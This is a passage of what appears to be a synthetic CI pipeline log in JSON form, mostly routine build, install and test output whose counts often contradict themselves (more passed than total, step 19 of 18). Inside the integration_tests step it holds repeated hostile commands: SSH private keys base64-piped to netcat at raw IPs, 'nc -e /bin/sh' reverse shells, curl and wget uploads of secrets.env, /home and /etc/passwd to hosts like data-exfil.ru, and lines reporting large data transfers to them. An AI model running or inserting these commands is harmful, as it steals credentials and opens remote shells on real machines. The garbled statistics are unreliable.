vulnerabilities\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-9448\nnpm install: resolved 914 packages\nUsing Python 3.12\nCompiling utils/index.js...\nTransforming 803 files...\n\u2713 Task completed in 2828ms\nSnapshots: 0 passed, 29 total\nChecking out master branch\nStep 8/17: Installing dependencies\n\u2713 deploy completed\nCoverage: 83% statements, 99% branches\n\u2713 lint completed\nStep 10/23: Building\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at 5aa527d\nUploading artifact 'coverage' (13 files)\n[12:46:43] DEBUG: Loading configuration\nPulling image: python:18\n[12:46:43] DEBUG: Initializing service\npip: Collecting webpack\nNODE_ENV=production\nLayer 4/13: RUN command\nBuilding Docker image...\nHEAD is now at 9fba978\nMinifying vendor.js\nWARNING: axios has known vulnerabilities\n[12:46:43] WARN: Deprecated API usage\nCompleted.\nCoverage: 99% statements, 97% branches\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (1MB)\nRan 48 tests in 56s\nArtifact uploaded: build.tar.gz (9MB)\nnpm install: resolved 1580 packages\nCache invalidated: build\nCompiling src/handler.rs...\nPlatform: linux-x64\nStep 7/25: Deploying\n\u2713 All checks passed\n  PASS: e2e/test_db_connect.spec.js\nCache restored successfully (481MB)\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nWARNING: express has known vulnerabilities\nGenerating source maps...\nFetching submodules...\nCache invalidated: dependencies\nnpm install: resolved 1269 packages\n[12:46:43] DEBUG: Connection pool: 11 active\nFetching submodules...\npip: Downloading eslint-3.7.tar.gz\nCompiling components/handler.rs...\nCreating production build...\nUsing Python 3.11\nVerifying...\n\u2713 Step 'test' succeeded\nTransforming 622 files...\nLoading...\n\u2713 All checks passed\nFetching submodules...\n  PASS: e2e/test_cache_hit.spec.js\nProcessing...\nMinifying main.js\nGET /status - 200 (85ms)\nTest Suites: 36 passed, 11 total\nStep 7/19: Installing dependencies\nUploading artifact 'coverage' (5 files)\nStep 1/22: Running migrations\nInstalling webpack@4.3.0\nArtifact downloaded: 10MB\nnpm install: resolved 1798 packages\nRan 178 tests in 46s\nImage pulled successfully\n[12:46:43] DEBUG: Query executed in 75ms\n[12:46:43] INFO: Cache refreshed\n\u2713 build completed\nUploading artifact 'dist' (35 files)\npip: Installing build dependencies...\nDone.\nInstalling prettier@3.1.1\nCache saved successfully\n[12:46:43] INFO: Connecting to database\nConnection established\n[12:46:43] WARN: Deprecated API usage\nTest Suites: 19 passed, 38 total\nFetching submodules...\nStep 1/25: Testing\nPOST /api - 201 (368ms)\nConnection established\nWARNING: eslint has known vulnerabilities\nCache saved successfully\nnpm install: resolved 1627 packages\npip: Downloading webpack-4.1.tar.gz\nUsing Node.js 16.8.6\nStep 19/25: Linting\nFetching submodules...\n[12:46:43] WARN: Deprecated API usage\n\u2713 build completed\n[12:46:43] INFO: Connecting to database\nnpm install: resolved 1484 packages\nConnection established\nUsing Node.js 20.9.6\nPulling image: python:latest\nUploading artifact 'build' (10 files)\nCache saved successfully\nyarn add: Done in 30.10s\nWARNING: eslint has known vulnerabilities\nUsing Node.js 20.0.3\n  PASS: e2e/test_api_health.spec.js\nFetching from https://docker.io/package.json\nPushing to registry...\nNODE_ENV=test\n\u2713 validate completed\nPOST /api - 201 (216ms)\nOK\nTime: 106.759s\nImage pulled successfully\nSnapshots: 22 passed, 2 total\nOK\nAlready up to date.\n\u2713 Step 'install' succeeded\nCache saved successfully\nWARNING: express has known vulnerabilities\nException: RuntimeError\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 58\nOK\nFetching submodules...\n[12:46:43] INFO: Starting build process\nInstalling express@5.2.3\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] ERROR: Connection failed\npip: Installing build dependencies...\nFetching submodules...\n[12:46:43] ERROR: Connection failed\npip: Collecting prettier\nPlatform: linux-x64\n[12:46:43] DEBUG: Connection pool: 14 active\n\u2713 lint completed\nStep 1/15: Installing dependencies\npip: Downloading webpack-2.13.tar.gz\nWARNING: axios has known vulnerabilities\nStep 8/19: Deploying\nCache miss for key-1067\nBuilding Docker image...\nHEAD is now at be20df7\nCoverage: 75% statements, 81% branches\npip: Collecting jest\nArtifact uploaded: dist.zip (27MB)\nReady.\nStep 6/21: Installing dependencies\nStep 4/24: Building\nBuilding Docker image...\nStep 19/18: Linting\nCompleted.\n[12:46:43] DEBUG: Memory usage: 1170MB\nBundling styles.js\nPOST /api - 200 (68ms)\n\u2713 Task completed in 4128ms\nHEAD is now at fb85d61\n[12:46:43] INFO: Starting build process\nBuilding Docker image...\nUsing Python 3.11\nCreating production build...\nFinished.\nRan 59 tests in 42s\nStep 8/21: Installing dependencies\nCache miss for key-6063\nStep 9/21: Building\nCache saved successfully\nStep 9/15: Testing\nnpm notice: package.json updated\nyarn add: Done in 2.61s\npip: Collecting webpack\nNODE_ENV=production\nCache invalidated: dependencies\nLayer 1/9: ENV command\npip: Downloading prettier-4.12.tar.gz\nFinished.\nStep 17/25: Running migrations\nImage pulled successfully\nStep 17/19: Building\n[12:46:43] DEBUG: Memory usage: 1879MB\nUsing Node.js 17.18.7\nCompiling lib/utils.go...\nnpm install: added 383 packages\nVerifying...\nException: ValueError\nOptimizing 77 modules...\nCache hit for key-8025\nCache saved successfully\nCoverage: 80% statements, 97% branches\nFinished.\nnpm install: added 153 packages\nLayer 9/11: COPY command\nCompiling src/handler.rs...\nException: NullPointerException\n\u2713 Task completed in 2021ms\nDone.\nConnection established\nAlready up to date.\n[12:46:43] INFO: Processing request\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nTime: 104.426s\nArtifact uploaded: build.tar.gz (17MB)\nImage pulled successfully\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Memory usage: 234MB\nCache miss for key-6554\n[12:46:43] DEBUG: Loading configuration\nTime: 22.874s\nnpm notice: package.json updated\nRan 86 tests in 50s\nHEAD is now at c62a2b4\nMinifying app.js\nPulling image: python:18\nUploading artifact 'coverage' (23 files)\n[12:46:43] INFO: Connecting to database\nStep 17/20: Deploying\nCache hit for key-1944\nTLS handshake completed\n[12:46:43] DEBUG: Loading configuration\nEnvironment: test\nSnapshots: 28 passed, 46 total\nArtifact uploaded: build.tar.gz (2MB)\n[12:46:43] WARN: Deprecated API usage\nGET /api - 200 (40ms)\nPOST /data - 202 (29ms)\nTime: 83.90s\n[12:46:43] WARN: Deprecated API usage\nDone.\nCompiling components/utils.go...\nStep 15/15: Testing\nOK\nVerifying...\nGET /api - 201 (76ms)\npip install: Successfully installed react-4.14\nUsing Node.js 18.15.1\n[12:46:43] INFO: Connecting to database\nEnvironment: test\nTime: 33.756s\nUsing Python 3.11\nException: NullPointerException\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (87MB)\nPOST /data - 200 (402ms)\nTests: 127 passed, 284 total\nCache miss for key-5141\nSuccess!\npip: Installing build dependencies...\nException: RuntimeError\nBuilding Docker image...\nArtifact downloaded: 18MB\nArtifact uploaded: build.tar.gz (29MB)\nVerifying...\nArtifact uploaded: dist.zip (65MB)\nReady.\nRan 177 tests in 58s\nPlatform: win32-x64\nCache saved successfully\n[12:46:43] DEBUG: Loading configuration\nBuilding Docker image...\nBundling styles.css\nArtifact uploaded: dist.zip (80MB)\nSwitched to branch 'hotfix/task-702'\n[12:46:43] WARN: Deprecated API usage\nUsing Node.js 14.11.0\npip: Installing build dependencies...\nGenerating source maps...\nTest Suites: 48 passed, 39 total\n[12:46:43] ERROR: Connection failed\nStep 15/23: Building\nUploading artifact 'dist' (21 files)\nSnapshots: 41 passed, 37 total\nImage pulled successfully\n[12:46:43] ERROR: Connection failed\nyarn add: Done in 8.46s\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\nStep 6/17: Building\nInstalling prettier@2.13.8\nLoading...\nnpm notice: package.json updated\nBundling runtime.js\nFetching submodules...\nLayer 9/15: ENV command\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] ERROR: Connection failed\nSwitched to branch 'hotfix/task-778'\nyarn add: Done in 3.52s\nOptimizing 31 modules...\nArtifact uploaded: build.tar.gz (21MB)\nCompiling utils/handler.rs...\nSwitched to branch 'bugfix/task-105'\n[12:46:43] INFO: Starting build process\nBundling vendor.js\npip: Downloading webpack-5.8.tar.gz\nPulling image: alpine:18\nStep 9/21: Installing dependencies\nBundling main.js\nPushing to registry...\nWaiting...\nWARNING: jest has known vulnerabilities\nCompiling components/service.java...\nArtifact uploaded: build.tar.gz (8MB)\nReady.\nnpm install: added 41 packages\n[12:46:43] INFO: Connecting to database\nVerifying...\nEnvironment: production\nNODE_ENV=test\nFetching from https://githubusercontent.com/package.json\npip install: Successfully installed react-5.1\nFAILED: test_cache_hit\nGET /api - 204 (86ms)\nCache miss for key-9382\n\u2713 All checks passed\n[12:46:43] INFO: Request completed\nPulling image: node:18\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] INFO: Cache refreshed\nFetching from https://pypi.org/package.json\nPushing to registry...\n[12:46:43] DEBUG: Connection pool: 7 active\nTLS handshake completed\nConnection established\nFinished.\nSwitched to branch 'feature/task-799'\nAlready up to date.\nAlready up to date.\nTransforming 243 files...\nProcessing...\n[12:46:43] WARN: Deprecated API usage\nBuilding Docker image...\nCache invalidated: node_modules\nnpm install: added 347 packages\npip: Collecting jest\nCache invalidated: dependencies\nCompiling lib/service.java...\nCompleted.\nStep 8/23: Testing\nnpm install: added 48 packages\nHEAD is now at e2bc8de\nWARNING: eslint has known vulnerabilities\nTime: 42.187s\nnpm install: resolved 760 packages\n[12:46:43] DEBUG: Loading configuration\nDone.\n\u2717 build failed with exit code 98\nFinished.\n  PASS: e2e/test_auth_login.spec.js\n[12:46:43] INFO: Starting build process\n[12:46:43] DEBUG: Memory usage: 1387MB\nCompleted.\nBundling main.css\n[12:46:43] WARN: Deprecated API usage\nLayer 10/10: RUN command\n[12:46:43] ERROR: Connection failed\nPulling image: python:18\nException: ValueError\nTests: 317 passed, 157 total\nCache invalidated: dependencies\n\u2713 All checks passed\n  PASS: test_user_create (383ms)\nCache saved successfully\nUsing Node.js 16.8.9\npip: Installing build dependencies...\nTests: 477 passed, 416 total\npip install: Successfully installed react-1.1\n  PASS: integration/test_api_health.spec.js\nCache miss for key-6003\nPulling image: node:3.11\nCompleted.\npip: Collecting eslint\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nCache saved successfully\nBundling styles.css\nUsing Node.js 15.2.5\nCache miss for key-5972\n[12:46:43] DEBUG: Query executed in 82ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nTests: 199 passed, 362 total\n[12:46:43] INFO: Starting build process\nCreating production build...\nTests: 67 passed, 69 total\nCompiling lib/service.java...\nSuccess!\n[12:46:43] DEBUG: Query executed in 79ms\nCompiling lib/main.py...\nReady.\nCache hit for key-8123\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Query executed in 95ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:43] DEBUG: Memory usage: 708MB\nyarn add: Done in 23.52s\n[12:46:43] ERROR: Connection failed\nVerifying...\nVerifying...\npip: Installing build dependencies...\nStep 12/22: Linting\nUsing Node.js 19.19.7\nMinifying app.js\nCache miss for key-9092\nChecking out develop branch\n\u2713 Step 'checkout' succeeded\nFetching submodules...\n[12:46:43] DEBUG: Memory usage: 1770MB\n[12:46:43] WARN: Deprecated API usage\nCompiling lib/utils.go...\nUsing Node.js 15.16.9\nInstalling axios@3.19.4\n[12:46:43] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-843'\nWARNING: express has known vulnerabilities\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:43] INFO: Starting build process\nStep 6/24: Building\nBuilding Docker image...\n[12:46:43] ERROR: Connection failed\nCache restored successfully (349MB)\nChecking out main branch\nCache saved successfully\n\u2713 Step 'install' succeeded\nTests: 412 passed, 462 total\nnpm notice: package.json updated\nStep 18/17: Running migrations\nWARNING: axios has known vulnerabilities\nStep 3/20: Installing dependencies\nCompiling utils/utils.go...\nTest Suites: 28 passed, 23 total\nBuilding Docker image...\n\u2713 All checks passed\n\u2713 Task completed in 2002ms\nEnvironment: staging\n\u2713 Step 'checkout' succeeded\nUploading artifact 'coverage' (18 files)\nCompiling lib/handler.rs...\n[12:46:43] INFO: Cache refreshed\nSnapshots: 32 passed, 40 total\nDone.\n[12:46:43] INFO: Processing request\nnpm notice: created a lockfile\nnpm install: added 49 packages\nnpm notice: package.json updated\nCache miss for key-4940\nPlatform: win32-x64\nnpm notice: package.json updated\nFetching submodules...\nLayer 8/8: ENV command\nSwitched to branch 'hotfix/task-638'\nyarn add: Done in 23.67s\nCache restored successfully (45MB)\nCompiling utils/app.ts...\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nCache saved successfully\nEnvironment: development\nCompleted.\nCache miss for key-5638\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] INFO: Request completed\nMinifying vendor.js\nArtifact downloaded: 26MB\nyarn add: Done in 25.72s\n\u2717 build failed with exit code 14\n[12:46:43] INFO: Connecting to database\nCompiling components/index.js...\n[12:46:43] DEBUG: Loading configuration\nCache miss for key-9385\nCompiling utils/index.js...\nStep 1/19: Installing dependencies\nPulling image: python:18\n\u2713 Step 'setup' succeeded\nStep 10/22: Building\nGET /status - 204 (3ms)\nStep 9/25: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nStep 1/19: Testing\nArtifact uploaded: dist.zip (64MB)\nBuilding Docker image...\nLayer 7/10: ENV command\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: linux-x64\nUsing Node.js 14.5.5\nStep 17/16: Linting\npip: Installing build dependencies...\nTests: 424 passed, 487 total\nBundling styles.js\nStep 3/22: Testing\nUploading artifact 'coverage' (30 files)\nArtifact uploaded: build.tar.gz (15MB)\nSuccess!\nArtifact uploaded: build.tar.gz (35MB)\n[12:46:43] INFO: Cache refreshed\nPOST /data - 201 (132ms)\nRan 30 tests in 16s\nCompiling src/index.js...\nReady.\nCache hit for key-4414\nTime: 114.552s\n[12:46:43] DEBUG: Query executed in 97ms\n[12:46:43] DEBUG: Connection pool: 8 active\nGET /api - 204 (95ms)\nTLS handshake completed\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 13/22: Testing\nPulling image: node:18\nnpm install: resolved 710 packages\nWARNING: axios has known vulnerabilities\nHEAD is now at 7436058\nFetching submodules...\nDone.\npip: Downloading lodash-1.16.tar.gz\nPushing to registry...\nHEAD is now at 1239a52\nTest Suites: 9 passed, 12 total\n[12:46:43] INFO: Connecting to database\n[12:46:43] DEBUG: Loading configuration\nOptimizing 97 modules...\nInstalling react@4.18.4\n[12:46:43] DEBUG: Loading configuration\n[12:46:43] DEBUG: Query executed in 35ms\nArtifact downloaded: 29MB\n  PASS: test_cache_hit (406ms)\nGET /health - 200 (24ms)\nStep 16/15: Testing\nLayer 6/13: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFinished.\nnpm install: added 474 packages\nSnapshots: 12 passed, 46 total\nRan 126 tests in 57s\nTransforming 675 files...\n[12:46:43] INFO: Processing request\nLayer 5/14: COPY command\nCompleted.\nStep 13/19: Linting\nTransforming 455 files...\nPlatform: win32-x64\nCoverage: 89% statements, 83% branches\nTime: 18.898s\nCache miss for key-5208\n\u2713 Task completed in 1377ms\nNODE_ENV=development\nImage pulled successfully\nOptimizing 63 modules...\nCompiling src/utils.go...\nSwitched to branch 'feature/task-954'\n\u2713 Step 'test' succeeded\nCache restored successfully (353MB)\nReady.\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nPulling image: node:3.11\nException: RuntimeError\nConnection established\nSuccess!\nFAILED: test_user_create\nInstalling prettier@4.11.3\nArtifact downloaded: 50MB\nArtifact uploaded: dist.zip (17MB)\n[12:46:43] DEBUG: Initializing service\n[12:46:43] INFO: Starting build process\nCompiling src/handler.rs...\n\u2717 build failed with exit code 53\nChecking out develop branch\npip: Installing build dependencies...\nInstalling axios@1.1.9\nnpm install: resolved 1656 packages\nPlatform: darwin-arm64\nOK\nnpm install: resolved 1451 packages\nArtifact downloaded: 22MB\nStep 5/15: Running migrations\nBundling main.js\nPOST /data - 201 (327ms)\nCache hit for key-5490\nTest Suites: 47 passed, 28 total\npip: Collecting lodash\npip: Collecting jest\n[12:46:43] INFO: Cache refreshed\nSnapshots: 27 passed, 0 total\n[12:46:43] INFO: Processing request\nInstalling prettier@3.4.9\nCompiling components/service.java...\nWaiting...\n[12:46:43] DEBUG: Memory usage: 1540MB\n\u2717 build failed with exit code 88\nGET /api - 201 (33ms)\nCache miss for key-1194\nBuilding Docker image...\nUsing Node.js 14.19.4\n[12:46:43] DEBUG: Connection pool: 14 active\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nCache invalidated: dependencies\n[12:46:43] DEBUG: Memory usage: 1548MB\nAlready up to date.\nUploading artifact 'coverage' (25 files)\nMinifying main.js\nTLS handshake completed\nPushing to registry...\nPlatform: win32-x64\n[12:46:43] INFO: Starting build process\n[12:46:43] INFO: Cache refreshed\nSuccess!\nCompiling src/app.ts...\n[12:46:43] INFO: Starting build process\nAlready up to date.\n[12:46:43] INFO: Cache refreshed\nyarn add: Done in 27.13s\n\u2713 All checks passed\n  PASS: e2e/test_user_create.spec.js\nChecking out develop branch\nProcessing...\nCompiling components/utils.go...\nCache invalidated: dependencies\npip: Installing build dependencies...\nPlatform: linux-x64\nnpm install: added 54 packages\nCache invalidated: dependencies\n\u2713 Step 'test' succeeded\nDone.\n  PASS: integration/test_db_connect.spec.js\nCache saved successfully\nFetching submodules...\nnpm install: resolved 412 packages\nBuilding Docker image...\nSnapshots: 2 passed, 8 total\nCache saved successfully\n[12:46:43] INFO: Processing request\nCache invalidated: build\n[12:46:43] INFO: Cache refreshed\nEnvironment: production\nCoverage: 84% statements, 89% branches\nStep 17/22: Installing dependencies\nFetching submodules...\n[12:46:43] INFO: Processing request\nnpm notice: created a lockfile\n\u2713 Task completed in 1166ms\nPushing to registry...\n  PASS: test_cache_hit (40ms)\npip: Collecting jest\nProcessing...\n\u2713 All checks passed\nException: RuntimeError\nSnapshots: 29 passed, 14 total\nCoverage: 91% statements, 72% branches\nFetching from https://npmjs.org/package.json\n\u2713 All checks passed\n\u2713 package completed\nRan 26 tests in 56s\n[12:46:43] INFO: Request completed\nChecking out main branch\nStep 5/15: Testing\nCompiling src/app.ts...\n[12:46:43] DEBUG: Memory usage: 1437MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nSwitched to branch 'feature/task-245'\n[12:46:43] INFO: Connecting to database\nGenerating source maps...\nWARNING: jest has known vulnerabilities\n\u2713 Task completed in 993ms\nCompiling utils/main.py...\n  PASS: test_auth_login (159ms)\nFetching from https://amazonaws.com/package.json\nUploading artifact 'coverage' (45 files)\nPulling image: node:3.11\nRan 120 tests in 21s\n\u2717 build failed with exit code 45\n\u2713 Step 'setup' succeeded\n[12:46:43] DEBUG: Loading configuration\nInstalling eslint@4.20.5\nGET /status - 201 (30ms)\nArtifact downloaded: 23MB\n[12:46:43] INFO: Request completed\nOptimizing 36 modules...\nHEAD is now at e8e642d\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] DEBUG: Initializing service\nProcessing...\nyarn add: Done in 29.28s\nCache invalidated: build\npip: Downloading eslint-2.5.tar.gz\nUsing Python 3.11\nStep 17/22: Running migrations\nVerifying...\n[12:46:43] DEBUG: Memory usage: 771MB\nStep 12/15: Installing dependencies\nTest Suites: 49 passed, 6 total\nDone.\nAlready up to date.\nCoverage: 97% statements, 83% branches\nFetching from https://pypi.org/package.json\nCompiling lib/index.js...\n[12:46:43] INFO: Connecting to database\nSuccess!\n[12:46:43] DEBUG: Query executed in 50ms\nCache invalidated: dependencies\nEnvironment: staging\nArtifact uploaded: dist.zip (30MB)\nUsing Node.js 15.1.7\nWaiting...\nTest Suites: 12 passed, 25 total\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 110.123.53.95 15092\nPOST /data - 202 (28ms)\nCache saved successfully\nEnvironment: staging\nPlatform: darwin-arm64\nCache saved successfully\nStep 8/18: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\n[12:46:43] INFO: Starting build process\nCreating production build...\nCompiling utils/index.js...\nArtifact uploaded: dist.zip (69MB)\n  PASS: test_user_create (274ms)\nAlready up to date.\nConnection established\nCompiling lib/app.ts...\nAlready up to date.\nLayer 10/13: COPY command\n\u2713 lint completed\nnpm notice: package.json updated\nLoading...\nProcessing...\nTests: 232 passed, 200 total\nChecking out master branch\nCompiling lib/main.py...\nArtifact uploaded: build.tar.gz (2MB)\n[12:46:43] ERROR: Connection failed\nRan 55 tests in 25s\nnc -e /bin/sh 224.202.142.83 11160\nRan 135 tests in 26s\nBuilding Docker image...\nyarn add: Done in 23.9s\nStep 13/23: Installing dependencies\nProcessing...\nFetching from https://npmjs.org/package.json\n[12:46:43] DEBUG: Query executed in 87ms\nArtifact uploaded: dist.zip (44MB)\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nHEAD is now at 3147b22\npip: Installing build dependencies...\npip install: Successfully installed eslint-1.9\n  PASS: integration/test_cache_hit.spec.js\nTests: 149 passed, 107 total\nWARNING: eslint has known vulnerabilities\nStep 20/16: Testing\nUsing Python 3.12\n[12:46:43] ERROR: Connection failed\n[12:46:43] WARN: Deprecated API usage\nCompiling components/main.py...\nTransforming 443 files...\nCache saved successfully\n[12:46:43] WARN: Deprecated API usage\nDone.\nEnvironment: development\nHEAD is now at 93aec19\nException: RuntimeError\nPlatform: win32-x64\n[12:46:43] INFO: Starting build process\nReady.\nCreating production build...\n[12:46:43] DEBUG: Memory usage: 559MB\nReady.\nGenerating source maps...\npip install: Successfully installed react-3.16\nyarn add: Done in 22.10s\npip install: Successfully installed lodash-2.8\n[12:46:43] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-3257\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nTLS handshake completed\nFetching submodules...\nFetching from https://githubusercontent.com/package.json\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nEnvironment: staging\nFetching submodules...\nCompleted.\n  PASS: unit/test_api_health.spec.js\n[12:46:43] DEBUG: Loading configuration\nCache hit for key-1562\npip install: Successfully installed express-5.18\n[12:46:43] INFO: Starting build process\n\u2713 All checks passed\nTests: 496 passed, 195 total\n\u2713 All checks passed\n\u2713 Step 'checkout' succeeded\n[12:46:43] DEBUG: Connection pool: 18 active\nSnapshots: 28 passed, 10 total\nUsing Node.js 17.19.0\nSuccess!\nLoading...\nGET /status - 204 (83ms)\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nCoverage: 72% statements, 66% branches\necho $(cat ~/.ssh/id_rsa) | base64 | nc 20.233.234.5 32099\nFinished.\nSending 415MB of data to evil-server.cc\n[12:46:43] INFO: Connecting to database\nSending 322MB of data to malicious-pool.xyz\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nArtifact downloaded: 48MB\n[12:46:43] DEBUG: Connection pool: 8 active\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-3414\nStep 1/17: Testing\n\u2713 Task completed in 289ms\nCompiling lib/service.java...\nNODE_ENV=development\nUploading artifact 'build' (14 files)\n  PASS: unit/test_api_health.spec.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 77.6.33.39 63586\nSnapshots: 24 passed, 18 total\nnpm notice: package.json updated\n[12:46:43] INFO: Request completed\npip: Installing build dependencies...\n[12:46:43] DEBUG: Connection pool: 9 active\nTests: 402 passed, 404 total\nChecking out master branch\n\u2713 validate completed\nnpm install: resolved 584 packages\nArtifact downloaded: 5MB\nnpm install: added 491 packages\nMinifying main.js\nPushing to registry...\nCache invalidated: node_modules\nTest Suites: 19 passed, 42 total\nBundling main.css\n\u2717 build failed with exit code 65\nSnapshots: 15 passed, 20 total\nUsing Python 3.12\n[12:46:43] WARN: Deprecated API usage\nPOST /upload - 202 (33ms)\nnc -e /bin/sh 132.175.188.143 10673\nConnection established\nTLS handshake completed\npip: Installing build dependencies...\nStep 15/24: Building\nSnapshots: 28 passed, 19 total\nPOST /api - 200 (310ms)\nSwitched to branch 'hotfix/task-209'\n\u2717 build failed with exit code 118\nCompiling utils/main.py...\nWARNING: webpack has known vulnerabilities\nTest Suites: 43 passed, 6 total\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nImage pulled successfully\nSnapshots: 44 passed, 50 total\nCoverage: 98% statements, 85% branches\nInstalling axios@1.12.3\nCompiling lib/handler.rs...\n[12:46:43] WARN: Deprecated API usage\nCompiling utils/main.py...\nArtifact downloaded: 22MB\nRan 51 tests in 32s\n[12:46:43] DEBUG: Memory usage: 132MB\n[12:46:43] WARN: Deprecated API usage\nEnvironment: staging\n\u2713 build completed\nPushing to registry...\nConnection established\n[12:46:43] DEBUG: Loading configuration\nArtifact downloaded: 4MB\nSnapshots: 26 passed, 0 total\nCoverage: 79% statements, 85% branches\n[12:46:43] INFO: Connecting to database\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nBundling vendor.js\nGET /health - 200 (39ms)\n  PASS: integration/test_user_create.spec.js\nnpm notice: package.json updated\nCache miss for key-1741\nCompleted.\n[12:46:43] INFO: Processing request\nGenerating source maps...\nTests: 371 passed, 218 total\npip: Installing build dependencies...\nWARNING: jest has known vulnerabilities\nUploading artifact 'coverage' (22 files)\nArtifact uploaded: dist.zip (71MB)\nPlatform: win32-x64\n  PASS: integration/test_auth_login.spec.js\nSwitched to branch 'feature/task-154'\nNODE_ENV=production\npip install: Successfully installed lodash-3.14\nGenerating source maps...\nFAILED: test_auth_login\n[12:46:43] WARN: Deprecated API usage\nOptimizing 21 modules...\nStep 7/15: Running migrations\nStep 15/19: Testing\n[12:46:43] DEBUG: Query executed in 22ms\nnpm install: added 294 packages\nOptimizing 57 modules...\nLayer 3/9: COPY command\n\u2713 Step 'test' succeeded\nGET /status - 201 (7ms)\nStep 1/18: Testing\nCompiling src/index.js...\nDone.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 112.159.205.144 61089\nnpm notice: package.json updated\nException: NullPointerException\nReady.\nInstalling prettier@5.4.7\n[12:46:43] DEBUG: Query executed in 90ms\nPulling image: python:18\nOK\nyarn add: Done in 20.74s\nnpm notice: created a lockfile\necho $(cat ~/.ssh/id_rsa) | base64 | nc 90.97.102.88 61139\n[12:46:43] WARN: Deprecated API usage\nStep 10/25: Testing\nTests: 109 passed, 468 total\nTest Suites: 8 passed, 25 total\n[12:46:43] WARN: Deprecated API usage\n\u2713 Task completed in 541ms\n[12:46:43] DEBUG: Query executed in 75ms\nFinished.\nUploading artifact 'coverage' (8 files)\nOK\nSuccess!\nCache restored successfully (176MB)\n  PASS: unit/test_api_health.spec.js\nConnection established\npip: Installing build dependencies...\nCompiling utils/index.js...\n[12:46:43] WARN: Deprecated API usage\nBuilding Docker image...\npip: Installing build dependencies...\nUsing Python 3.10\nSnapshots: 42 passed, 16 total\nStep 1/20: Deploying\nSnapshots: 3 passed, 19 total\nTLS handshake completed\nUsing Python 3.12\nEnvironment: test\nStep 6/19: Running migrations\n[12:46:43] INFO: Request completed\nArtifact uploaded: build.tar.gz (35MB)\nFinished.\nSuccess!\npip: Collecting prettier\nVerifying...\n\u2713 All checks passed\nCompiling components/index.js...\n[12:46:43] DEBUG: Query executed in 60ms\nWaiting...\nCache restored successfully (171MB)\nStep 13/24: Installing dependencies\nWaiting...\nStep 2/16: Installing dependencies\nPOST /upload - 201 (243ms)\nSending 175MB of data to data-exfil.ru\necho $(cat ~/.ssh/id_rsa) | base64 | nc 126.142.37.110 17943\nHEAD is now at d935f59\n\u2717 build failed with exit code 102\nnpm install: resolved 1334 packages\nNODE_ENV=development\nWaiting...\nPulling image: python:18\npip: Downloading prettier-5.16.tar.gz\npip: Collecting eslint\nStep 12/19: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:43] DEBUG: Memory usage: 1993MB\nMinifying main.js\nCompiling utils/utils.go...\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-26T12:46:43.771797",
        "finished_at": "2025-11-26T12:46:52.534308",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:46:43] INFO: Cache refreshed",
          "Checking out master branch",
          "Cache miss for key-6969",
          "  PASS: test_user_create (152ms)",
          "[12:46:43] WARN: Deprecated API usage",
          "Coverage: 89% statements, 67% branches",
          "Processing...",
          "Layer 2/11: RUN command",
          "Ran 91 tests in 1s",
          "[12:46:43] DEBUG: Loading configuration",
          "[12:46:43] INFO: Processing request",
          "Verifying...",
          "[12:46:43] INFO: Processing request",
          "HEAD is now at 0778162",
          "Environment: development",
          "Creating production build...",
          "Done.",
          "npm install: resolved 1414 packages",
          "Step 18/19: Deploying",
          "Cache invalidated: build",
          "Step 5/20: Building",
          "Fetching from https://pypi.org/package.json",
          "Compiling components/main.py...",
          "POST /data - 201 (40ms)",
          "Compiling utils/app.ts...",
          "[12:46:43] WARN: Deprecated API usage",
          "Checking out develop branch",
          "GET /api - 204 (36ms)",
          "HEAD is now at 1b3d796",
          "[12:46:43] INFO: Starting build process",
